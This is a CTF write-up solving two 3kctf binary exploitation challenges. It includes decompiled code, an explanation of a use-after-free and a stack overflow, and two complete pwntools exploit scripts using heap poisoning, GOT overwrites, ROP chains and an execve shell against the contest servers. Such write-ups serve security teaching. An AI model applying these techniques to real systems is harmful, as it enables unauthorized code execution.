
# 3kctf pwn challenges.

I played 3kctf with team `from Sousse, with love` we ranked 5th on the final scoreboard. I solved two challenges.

#### Challenge name `faker`

```
description

faker - 497pts
6 solves

nc faker.3k.ctf.to 5231

link

Note: Ubuntu GLIBC 2.27-3ubuntu1.2

Author: KERRO, Aracna
Hints
1. flag file: flag

```

This was a simple heap challenge which uses `calloc` to allocate chunk, There was a usual `use after free bug`. The challenge used seccomp and execve was not allowed.`ORW` was the way out.

TL;DR
`
-> Allocate chunk size 0x70, free the chunk, Use UAF bug to change the fd pointer near stderr pointer on bss, 0x7f size passes the check, allocate fake chunk, this allows us to overwrite the pointers(notes), and edit them. Change note1 to free[got], edit note1 will overwrite the got since it was partial relro, Change free to printf, so when we try to free the chunk, it calls printf, leak libc leak stack , edit the note-2 which is still pointer right under stderr, this allows us overwrite the note1 again. change note 1 to stack returnaddress, using edit construct rop chain there.
`


#### new page

New page function just asks for the size and alloctes the chunk with malloc
```c

00400c33  uint64_t rax_1
00400c33  if (*number_pages s> 4)
00400c3f      rax_1 = puts(data_4011d8)  {"Too much pages it will be really…"}
00400c50  else
00400c50      puts(data_401200)  {"Provide page size:"}
00400c66      void var_15
00400c66      read(0, &var_15, 4)
00400c72      rax_1 = atoi(&var_15)
00400c77      int32_t var_10_1 = rax_1:0.d
00400c7a      if (var_10_1 s< 0 || (var_10_1 s>= 0 && var_10_1 s> 0x70))
00400d5a          rax_1 = puts(data_401231)  {"Bad size kiddo..."}
00400c7a      if (var_10_1 s>= 0 && var_10_1 s<= 0x70)
00400d4b          for (int32_t var_c_1 = 0; var_c_1 s<= 4; var_c_1 = var_c_1 + 1)
00400c9f              int64_t rdx_1 = sx.q(var_c_1) << 2
00400cae              rax_1 = zx.q(*(rdx_1 + check_pages))
00400ce2              if (rax_1:0.d == 0)
00400ce2                  *((sx.q(var_c_1) << 3) + pages) = calloc(1, sx.q(var_10_1), rdx_1)
00400cfa                  *((sx.q(var_c_1) << 2) + check_pages) = 1
00400d06                  int64_t rcx_2 = sx.q(var_c_1) << 2
00400d15                  uint64_t rdx_4 = zx.q(var_10_1)
00400d18                  *(rcx_2 + page_size) = rdx_4:0.d
00400d2c                  printf(data_401213, zx.q(var_c_1), rdx_4, rcx_2)  {"You got new page at index %d\n"}
00400d37                  rax_1 = zx.q(*number_pages + 1)
00400d3a                  *number_pages = rax_1:0.d
00400d41                  break
00400d61  return rax_1

```


#### edit
The bug is in edit function which doesn't check if the note was freed. This gives UAF.

```c
00400d71  puts(data_401243)  {"Provide page index:"}
00400d87  void var_11
00400d87  read(0, &var_11, 4)
00400d98  int32_t var_c = atoi(&var_11):0.d
00400d9b  int64_t rax_3
00400d9b  if (var_c s< 0 || (var_c s>= 0 && var_c s> 4))
00400e18      rax_3 = puts(data_401271)  {"Wrong index kiddo..."}
00400d9b  if (var_c s>= 0 && var_c s<= 4)
00400dbb      rax_3 = *((sx.q(var_c) << 3) + pages)
00400dbf      if (rax_3 != 0)
00400dcb          puts(data_401257)  {"Provide new page content:"}
00400def          int64_t rcx_1 = sx.q(var_c) << 3
00400e0a          rax_3 = read(0, *(rcx_1 + pages), sx.q(*((sx.q(var_c) << 2) + page_size)), rcx_1)
00400e1e  return rax_3
```


#### empty page
this function takes idx and deletes the note.
It initializes check_pages(global_variable) to zero.
But edit function doesn't checks for it .)
```c
00400e2e  puts(data_401243)  {"Provide page index:"}
00400e44  void var_11
00400e44  read(0, &var_11, 4)
00400e55  int32_t var_c = atoi(&var_11):0.d
00400e58  uint64_t rax_4
00400e58  if (var_c s< 0 || (var_c s>= 0 && var_c s> 4))
00400ee0      rax_4 = puts(data_401271)  {"Wrong index kiddo..."}
00400e58  if (var_c s>= 0 && var_c s<= 4)
00400e7b      if (*((sx.q(var_c) << 2) + check_pages) != 0)
00400ea8          free(*((sx.q(var_c) << 3) + pages))
00400ec1          *((sx.q(var_c) << 2) + check_pages) = 0
00400ece          rax_4 = zx.q(*number_pages - 1)
00400ed1          *number_pages = rax_4:0.d
00400e86      else
00400e86          rax_4 = puts(data_401286)  {"Empty already..."}
00400ee7  return rax_4

```

Using the bug we I changed the fd of fastbin to pointer under `stderr pointer on bss` and control the program execution flow. To leak libc i changed free[got] to printf. And keep %p into the data of that chunk. This leaks the libc and stack addresses
Here is my full exploit.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host linker.3k.ctf.to --port 9654 ./linker
from pwn import *
from formatstring import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./faker')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'faker.3k.ctf.to'
port = int(args.PORT or 5231)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x400D6C
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
name_size = 0x0602148

io = start()

def new(size):
	io.recvuntil('> ')
	io.sendline('1')
	io.recvuntil('page size:\n')
	io.sendline(str(size))

def edit(idx, data):
	io.recvuntil('> ')
	io.sendline('2')
	io.recvuntil('index:\n')
	io.sendline(str(idx))
	io.recvuntil('content:\n')
	io.send(data)

def delete(idx):
	io.recvuntil('> ')
	io.sendline('3')
	io.recvuntil('index:\n')
	io.sendline(str(idx))


pop_rdx_rsi = 0x00130889
pop_rsp = 0x0019a6c2
pop_rdi = 0x0016619e
pop_rax = 0x0010fedc
pop_r10 = 0x00130865
sys_ret = 0x0010fbc5


io.recvuntil('name size:\n')
size = 8
io.sendline(str(size))
io.recvuntil('name:\n')
io.send(p64(0x7f))
new(0x68)
edit(0, 'A'*0x68)
delete(0)
edit(0, p64(0x6020bd))
new(0x68)
new(0x68)
edit(1, b'%p.' + b'%p'*20 +p64(0x6161616161616161)*5 + p64(exe.got['free']))
edit(0, p64(exe.sym.printf + 6))
delete(1)
io.recvuntil('0x100400b0a')
stack = int(io.recvn(14), 0)
io.recvuntil('0x4010c0')
libc.address = int(io.recvn(14), 0) -(0x7fd6e70a8b97 - 0x7fd6e7087000)
log.info('stack {}'.format(hex(stack)))
log.info('Libc leak {}'.format(hex(libc.address)))
edit(1, b'%p.' + b'\x01'*0x38+b'/home/ctf/flag\x00\x00'+p64(0x6161616161616161)*1 +p64(stack+8))
rop = flat([
	libc.address +pop_rdx_rsi,
	0x0,
	0x602108,
	libc.address+pop_r10,
	0x0,
	libc.address+pop_rax,
	257,
	libc.address+sys_ret,
	libc.address+pop_rdi,
	0x6,
	libc.address+pop_rdx_rsi,
	0x100,
	0x602108,
	libc.address+pop_rax,
	0x0,
	libc.address+sys_ret,
	libc.address+pop_rdi,
	0x602108,
	libc.sym.puts

])
test = flat([
	libc.address+pop_rdi,
	0x602108,
	libc.sym.puts,
	0x400EE8
])
edit(0, rop)
io.recvuntil('> ')
pause()
io.sendline('5')
io.interactive()

```


### one and a half man - 493pts

Challenge description.
```
## one and a half man - 493pts

15 solves

nc one-and-a-half-man.3k.ctf.to 8521

link

Note: Ubuntu GLIBC 2.27-3ubuntu1.2

Author: KERRO, Aracna
```
This was a fairly another simple pwnable challenge.

The code is so small.
```cpp=
int main(){

    setvbuf(stderr, 0,2,0);
    setvbuf(stdout, 0,2,0);
    vuln();
    return 0;
}
```

```cpp=
void vuln() {
    char buff[10];
    read(0, buff, 0xaa);
}
```
There is a simple buffer overflow.
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
No Pie and Partial Relro :face_vomiting:

###### exploit
```
There is a syscall resides inside read.
So change read got last byte to make it point at syscall. And then Just control registers,
and some advanced ROP stuff, there isn't enough space for whole ROP chain so
first pivot the stack to bss.
Read another ROP chain there and continue from there.
Ret2csu to control the RDX register.
To set RAX = 0x3b
I make a read syscall and send exact 0x3b number of bytes. and do 'execve' -> binsh
```
#### Here is the whole exploit.

```python

#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenges.ctfd.io --port 30096 ./bof
from pwn import *
#import roputils as we
# Set up pwntools for the correct architecture
elf = context.binary = ELF('./one_and_a_half_man')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'one-and-a-half-man.3k.ctf.to'
port = int(args.PORT or 8521)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x4005DC
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()


bss = 0x601068
leave_r = 0x004005db #: leave ; ret ;
pop_rdi = 0x00400693 #: pop rdi ; ret  ;
pop_rsi = 0x00400691 #: pop rsi ; pop r15 ; ret  ;
mov_r14 = 0x00400670
add_rbp = 0x00401108
pop_r45 = 0x00400690 #: pop r14 ; pop r15 ; ret  ;
csu = 0x040068A
init = 0x600e38
ret = 0x0040062d

rop1 = flat([
	'A'*10,bss,
	pop_rsi, bss+8, 0x0,
	elf.sym.read, leave_r
])
io.send(rop1)
pause()
rop2 = flat([
	csu, 0x0, 0x1, init, 0x0, 0x0,0x1000, mov_r14, 0x0,0x0,bss,0x0,0x0,0x0,0x0,
	pop_rsi, bss+0x98,0,
	elf.sym.read,leave_r
])

io.send(rop2)

r2 = flat([
        '/bin/sh\x00',
	pop_rsi, elf.got['read'], 0x0,
	elf.sym.read,
	csu, 0x0, 0x1, init, 0x0,0x0, (bss + 0x300), mov_r14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
	pop_rsi, (bss + 0x300), 0x0,
	elf.sym.read,
	pop_rdi, bss+0x98,
	pop_rsi, (bss + 0x308), 0x0,
	elf.sym.read
])
pause()
io.send(r2)
pause()
print('NOW')
io.send('\x8f')
pause()
io.send(p64(0x0) + p64(bss + 0x310) + '\x00'*43)
io.interactive()


```
#### Second blood.

Both exploit scripts at https://github.com/hkraw/ctf_/tree/master/3kctf

